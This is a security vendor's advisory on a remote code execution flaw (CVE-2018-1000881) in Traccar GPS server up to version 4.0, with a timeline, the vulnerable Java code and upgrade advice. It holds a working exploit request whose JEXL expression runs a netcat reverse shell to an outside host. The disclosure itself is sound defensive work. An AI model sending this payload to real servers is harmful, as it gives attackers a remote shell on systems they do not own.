=== Content from appcheck-ng.com_f0f6c6b2_20250125_110231.html ===

[Skip to content](#content)
[![](https://appcheck-ng.com/wp-content/uploads/2023/06/logo.png)](https://appcheck-ng.com)

* [Home](https://appcheck-ng.com/)
* Services
  + [Web Application Scanning](https://appcheck-ng.com/web-application-scanning/)
  + [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
  + [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
  + [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
  + [Single Page Application Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [Security Blog](https://appcheck-ng.com/security-blog/)
* [Case Studies](https://appcheck-ng.com/case-studies/)
* [Get Help](https://appcheck-ng.com/get-help/)
  + [Documentation](https://appcheck-ng.com/get-help/documentation/)
  + [Downloads](https://appcheck-ng.com/get-help/downloads/)
  + [Contact Support](https://appcheck-ng.com/contact-support/)
* [Become a partner](https://appcheck-ng.com/more/become-a-partner/)
* More
  + [About Us](https://appcheck-ng.com/about-us/)
    - [Our Story](/about-us/)
  + [Careers](https://appcheck-ng.com/more/careers/)
  + [Contact](https://appcheck-ng.com/contact/)
* [Start your free trial](#StartYourFreeTrial)

* [Home](https://appcheck-ng.com/)
* Services
  + [Web Application Scanning](https://appcheck-ng.com/web-application-scanning/)
  + [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
  + [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
  + [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
  + [Single Page Application Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [Security Blog](https://appcheck-ng.com/security-blog/)
* [Case Studies](https://appcheck-ng.com/case-studies/)
* [Get Help](https://appcheck-ng.com/get-help/)
  + [Documentation](https://appcheck-ng.com/get-help/documentation/)
  + [Downloads](https://appcheck-ng.com/get-help/downloads/)
  + [Contact Support](https://appcheck-ng.com/contact-support/)
* [Become a partner](https://appcheck-ng.com/more/become-a-partner/)
* More
  + [About Us](https://appcheck-ng.com/about-us/)
    - [Our Story](/about-us/)
  + [Careers](https://appcheck-ng.com/more/careers/)
  + [Contact](https://appcheck-ng.com/contact/)
* [Start your free trial](#StartYourFreeTrial)

* [Uncategorised](https://appcheck-ng.com/category/uncategorised/)

* December 4, 2018

# Advisory: Remote Code Execution Traccar Server <=4.0 (AC-2018-10-8-1)

Our security team discovered a Remote Code Execution (RCE) vulnerability in the GPS vehicle tracking system Traccar (version <= 4.0). This allows an attacker to compromise the server’s host via a self-registered user account.

Our security team discovered a [Remote Code Execution (RCE)](https://appcheck-ng.com/remote-code-execution/) vulnerability in the GPS vehicle tracking system Traccar (version <= 4.0).  This allows an attacker to compromise the server’s host via a *self-registered* user account.

If you use Traccar server, please update to >= v4.1 as soon as possible.

### Vulnerability Identification

* AppCheck ID: AC-2018-10-8-1
* CVE: CVE-2018-1000881

###

### Traccar

Traccar is a widely deployed Open Source GPS tracking system which supports over one thousand different devices/protocols.  The source tracking data is collected from devices by the server and is used to provide useful organisational services via a web portal, such as for logistics and efficient transportation worldwide.

###

### Timeline

* Discovered: 8th October 2018
* Reported to Vendor: 11th October 2018
* Fixed/Mitigated: 12th October 2018 ([diff1](https://github.com/traccar/traccar/commit/a1397ca05d9000b914b249b78997f7f3ebb14319), [diff2](https://github.com/traccar/traccar-web/commit/d15fa5e2316b62884e48830c6c0bacb54ed1cd52)) (kudos to **Anton Tananaev** for his fast response to this)
* Fix Released (v 4.1): 20th October 2018 ([release article](https://www.traccar.org/blog/traccar-4-1/))
* Advisory Published: 4th December 2018

###

### Vulnerability Details

A feature of the application allows a self-registered user to create [*expressions*](https://www.traccar.org/documentation/computed-attributes/) which effectively normalise the output of their tracking devices in order to improve integration with the application.

Examples are such as synthesising the engine state of vehicles where that data is lacking from the particular device by inferring it from the device’s battery charge state.

These expressions are interpreted by the third-party **JexlEngine** without adequate restriction from the Java Virtual Machine (JVM).  As such, a crafted JEXL script can allow an attacker to compromise the server.

### Example Crafted Request

```
POST /traccar/api/attributes/computed/test?deviceId=1 HTTP/1.1
Host: foo.host.com
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Cookie: JSESSIONID=...; ext-devices-...

{"id":-1,"description":"test","type":"string","attribute":"raw",
"expression":"''.class.class.forName('java.lang.Runtime')
.getRuntime().exec('nc -nv 1.2.3.4 443 -e /bin/bash')"}
```
### Vulnerable Code

```
// src/org/traccar/processing/ComputedAttributesHandler.java
package org.traccar.processing;
...
import org.traccar.model.Position;

@ChannelHandler.Sharable
public class ComputedAttributesHandler extends BaseDataHandler {

    public ComputedAttributesHandler() {
        engine = new JexlEngine();
        engine.setStrict(true);
        ...
    }

    private MapContext prepareContext(Position position) {
        MapContext result = new MapContext();
        ...
        return result;
    }

    public Object computeAttribute(Attribute attribute, Position position) throws JexlException {
        return engine.createExpression(attribute.getExpression()).evaluate(prepareContext(position));
    }
    ...
}
```
### PoC Exploitation

A proof-of-concept tool ([traccar\_exploit.v1.py](https://appcheck-ng.com/wp-content/uploads/2018/12/traccar_exploit.v1.py_.txt)) was was written to exploit this vulnerability and is demonstrated in [this video](https://www.youtube.com/watch?v=EpqnwS3H55M)

###

### References

* <https://www.traccar.org/>
* <https://www.traccar.org/documentation/computed-attributes/>
* <http://commons.apache.org/proper/commons-jexl/>
* <https://www.traccar.org/blog/traccar-4-1/>
* <https://github.com/traccar/traccar/commit/a1397ca05d9000b914b249b78997f7f3ebb14319>
* <https://github.com/traccar/traccar-web/commit/d15fa5e2316b62884e48830c6c0bacb54ed1cd52>
* <https://www.youtube.com/watch?v=EpqnwS3H55M>
* <https://appcheck-ng.com/wp-content/uploads/2018/12/traccar_exploit.v1.py_.txt>

#### Get started with Appcheck

No software to download or install.

Contact us or call us 0113 887 8380

[Start your free trial](#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjEzOTUiLCJ0b2dnbGUiOmZhbHNlfQ%3D%3D)

### Further Reading

* Research

* [June 28, 2023](https://appcheck-ng.com/2023/06/28/)

# [Deep Dive: Logging](https://appcheck-ng.com/deep-dive-logging/)

* Research

* [January 23, 2025](https://appcheck-ng.com/2025/01/23/)

# [Strengthening Security Testing in the Software Development Lifecycle (SDLC)](https://appcheck-ng.com/strengthening-security-testing-in-the-software-development-lifecycle-sdlc/)

* Technical Updates

* [January 22, 2025](https://appcheck-ng.com/2025/01/22/)

# [Oracle Critical Patch Update January 2025](https://appcheck-ng.com/oracle-critical-patch-update-january-2025/)

* Product

* [January 20, 2025](https://appcheck-ng.com/2025/01/20/)

# [Improving our product design in 2025](https://appcheck-ng.com/improving-our-product-design-in-2025/)

* Security Alerts

* [January 17, 2025](https://appcheck-ng.com/2025/01/17/)

# [Known Actively Exploited Vulnerabilities Round-up (10.01.25-16.01.25)](https://appcheck-ng.com/known-actively-exploited-vulnerabilities-round-up-10-01-25-16-01-25/)

* Security Alerts

* [January 15, 2025](https://appcheck-ng.com/2025/01/15/)

# [Microsoft Patch Tuesday – January 14th 2025](https://appcheck-ng.com/microsoft-patch-tuesday-january-14th-2025/)

* Research

* [January 14, 2025](https://appcheck-ng.com/2025/01/14/)

# [How to Build a Secure CI/CD Pipeline with Best Practices for 2025](https://appcheck-ng.com/how-to-build-a-secure-ci-cd-pipeline-with-best-practices-for-2025/)

![](https://appcheck-ng.com/wp-content/uploads/2024/02/Appcheck_logo_icon.svg)

## About Appcheck

AppCheck is a software security vendor based in the UK, offering a leading security scanning platform that automates the discovery of security flaws within organisations websites, applications, network and cloud infrastructure. AppCheck are authorized by te Common Vulnerabilities and Exposures (CVE) Program aas a CVE Numbering Authority (CNA)

## Put us to the test.Try AppCheck for free

No software to download or install.

Contact us or call us 0113 887 8380

Start your free trial

[![](https://appcheck-ng.com/wp-content/uploads/2023/06/logo.png)](https://appcheck-ng.com)

[![](https://appcheck-ng.com/wp-content/uploads/2023/06/iso_badge.jpg)](https://appcheck-ng.com/wp-content/uploads/2024/11/ISO-27001-_-2013-Certificate-1.pdf)

##### Services

* [Web App Scanning](https://appcheck-ng.com/web-application-scanning/)
* [Single Page App Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
* [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
* [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
* [DAST](https://appcheck-ng.com/dast/)
* [Vulnerability Scanning](https://appcheck-ng.com/vulnerability-scanner/)
* [External Vulnerability Scanner](https://appcheck-ng.com/external-vulnerability-scanning/)
* [Automated Penetration Testing](https://appcheck-ng.com/?page_id=416)

* [Web App Scanning](https://appcheck-ng.com/web-application-scanning/)
* [Single Page App Scanning](https://appcheck-ng.com/single-page-application-security-scanning/)
* [CMS Security Scanning](https://appcheck-ng.com/cms-security-scanning/)
* [Infrastructure Scanning](https://appcheck-ng.com/infrastructure-scanning/)
* [API Security Scanning](https://appcheck-ng.com/api-security-scanning/)
* [DAST](https://appcheck-ng.com/dast/)
* [Vulnerability Scanning](https://appcheck-ng.com/vulnerability-scanner/)
* [External Vulnerability Scanner](https://appcheck-ng.com/external-vulnerability-scanning/)
* [Automated Penetration Testing](https://appcheck-ng.com/?page_id=416)

##### Company

* [About Us](https://appcheck-ng.com/about-us/)
* [AppCheck Privacy Policy](https://appcheck-ng.com/privacy-policy/)
* [Cookie Policy](https://appcheck-ng.com/cookie-policy/)
* [Compliance Information](https://appcheck-ng.com/compliance/)
* [Existing Customer?](https://scanner.appcheck-ng.com/)

* [About Us](https://appcheck-ng.com/about-us/)
* [AppCheck Privacy Policy](https://appcheck-ng.com/privacy-policy/)
* [Cookie Policy](https://appcheck-ng.com/cookie-policy/)
* [Compliance Information](https://appcheck-ng.com/compliance/)
* [Existing Customer?](https://scanner.appcheck-ng.com/)

##### Resources

* [Brochure](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Brochure.pdf)
* [AppCheck Benefits Overview](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Benefits.pdf)
* [OWASP Top 10](/wp-content/uploads/2023/06/AppCheck_OWASP_Top10_2021.pdf)
* [Sample Report](/wp-content/uploads/2023/06/AppCheck_Sample_Report.pdf)
* [Start Your Trial](#StartYourFreeTrial)

* [Brochure](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Brochure.pdf)
* [AppCheck Benefits Overview](https://appcheck-ng.com/wp-content/uploads/2023/10/AppCheck-Benefits.pdf)
* [OWASP Top 10](/wp-content/uploads/2023/06/AppCheck_OWASP_Top10_2021.pdf)
* [Sample Report](/wp-content/uploads/2023/06/AppCheck_Sample_Report.pdf)
* [Start Your Trial](#StartYourFreeTrial)

##### Keep in touch

email

 I agree to receive information and commercial offers about AppCheck Ltd.
 Submit

AppCheck Ltd. is a company registered in England and Wales with company number 06888174

## Start your free trial

Simply complete the form and we’ll send you all you need to activate AppCheck and undertake your FREE scan.

**Your details**
Full Name

Company Name

Work Email

Telephone

Where did you hear about AppCheck?

**IP Addresses**
Please enter your IP address ranges

**URLs**
Please enter full URLs for your web applications, and both http and https where appropriate

 I have read and agreed to our [Privacy Policy](/privacy-policy/)
 I agree to receive information and commercial offers about AppCheck Ltd.

Submit

# Get in touch


